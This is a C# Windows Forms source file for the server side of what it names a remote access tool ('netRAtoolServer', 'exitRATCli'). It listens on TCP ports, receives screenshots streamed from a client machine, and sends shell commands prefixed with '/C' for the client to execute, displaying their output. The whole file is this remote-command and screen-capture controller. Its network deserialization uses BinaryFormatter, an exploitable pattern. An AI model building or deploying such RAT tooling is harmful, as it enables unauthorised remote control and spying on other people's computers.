using System;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing;

namespace netRAtoolServer
{
    public partial class Form1 : Form
    {
        private int portServCMD;
        private int portServIMG;
        private TcpClient clientCMD;
        private TcpClient clientIMG;
        private TcpListener serverCMD;
        private TcpListener serverIMG;

        private bool threadON;
        private Thread Listening;
        private Thread GetDataIMG;
        private Thread GetDataCMD;
        BinaryFormatter binFormatter;

        public Form1()
        {
            InitializeComponent();
        }

        private void StartListening()
        {
            threadON = true;

            while (!clientIMG.Connected)
            {
                serverIMG.Start();
                clientIMG = serverIMG.AcceptTcpClient();
            }
            GetDataIMG.Start();
            
            while (!clientCMD.Connected)
            {
                serverCMD.Start();
                clientCMD = serverCMD.AcceptTcpClient();
            }
            GetDataCMD.Start();

            Console.WriteLine("# Thread StartListening is finish");
        }

        private void ReciveDataFromClientIMG()
        {
            BinaryFormatter binFormatterRecive = new BinaryFormatter();
            NetworkStream mainStream;

            while (clientIMG.Connected && threadON)
            {
               try
                {
                    mainStream = clientIMG.GetStream();
                    try
                    {
                        pictureBox1.Image = (Image)binFormatterRecive.Deserialize(mainStream);
                    }
                    catch
                    {
                        ;
                    }
                }
                catch
                {
                    Console.WriteLine("# Thread ReciveDataFromClientIMG: Client close");

                    if (this.button2.InvokeRequired)
                    {
                        this.Invoke(new Action(() => button2.PerformClick()));
                    }
                }
            }

            Console.WriteLine("# Thread ReciveDataFromClientIMG is finish");
        }

        private void ReciveDataFromClientCMD()
        {
            BinaryFormatter binFormatterRecive = new BinaryFormatter();
            String dataClientSend;
            NetworkStream mainStream;

            while (clientCMD.Connected && threadON)
            {
                mainStream = clientCMD.GetStream();

                try
                {
                    dataClientSend = (String)binFormatterRecive.Deserialize(mainStream);
                    if (this.textBox3.InvokeRequired)
                    {
                        this.Invoke(new Action(() => textBox3.AppendText("[" + (DateTime.Now).ToString("HH:mm:ss") + "]" + " RECIVE FROM CLIENT:" + Environment.NewLine + dataClientSend + Environment.NewLine + "## END MSG ##\n")));
                    }
                }
                catch
                {
                    Console.WriteLine("# Thread ReciveDataFromClientCMD: Client close");

                    if (this.button2.InvokeRequired)
                    {
                        this.Invoke(new Action(() => button2.PerformClick()));
                    }
                }
            }

            Console.WriteLine("# Thread ReciveDataFromClientCMD is finish");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text.StartsWith("Listen"))
            {
                try
                {
                    portServCMD = Int32.Parse(textBox1.Text);
                    portServIMG = Int32.Parse(textBox4.Text);
                    clientCMD = new TcpClient();
                    clientIMG = new TcpClient();
                    serverCMD = new TcpListener(IPAddress.Any, portServCMD);
                    serverIMG = new TcpListener(IPAddress.Any, portServIMG);

                    binFormatter = new BinaryFormatter();
                    Listening = new Thread(StartListening);
                    GetDataIMG = new Thread(ReciveDataFromClientIMG);
                    GetDataCMD = new Thread(ReciveDataFromClientCMD);

                    textBox3.Clear();

                    Listening.Start();

                    button1.Text = "Execute command";
                    label3.Visible = true;
                    textBox2.Visible = true;
                    button2.Visible = true;
                }
                catch
                {
                    MessageBox.Show("Wrong PORT !!!!");
                }
            }
            else
            {
                String cmdInputArg = "/C ";
                cmdInputArg += textBox2.Text;

                Console.WriteLine(">> Try execute: " + cmdInputArg);

                textBox2.Clear();
                NetworkStream mainStream = clientCMD.GetStream();
                if(mainStream.CanWrite)
                {
                    binFormatter.Serialize(mainStream, cmdInputArg);
                    Console.WriteLine(">> Send");
                }
                else
                {
                    textBox3.AppendText("[" + (DateTime.Now).ToString("HH:mm:ss") + "]" + "Cannot execute command");
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (button1.Text.StartsWith("Execute"))
            {
                serverCMD.Stop();
                serverIMG.Stop();
                clientCMD.Close();
                clientIMG.Close();
                clientCMD = null;
                clientIMG = null;

                threadON = false;

                if (Listening.IsAlive) Listening.Abort();
                if (GetDataIMG.IsAlive) GetDataIMG.Abort();
                if (GetDataCMD.IsAlive) GetDataCMD.Abort();

                button1.Text = "Listen";
                label3.Visible = false;
                button2.Visible = false;
                textBox2.Visible = false;
                pictureBox1.Image = null;
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {
            textBox2.Text = "exitRATCli";
            button1.PerformClick();
        }
    }
}
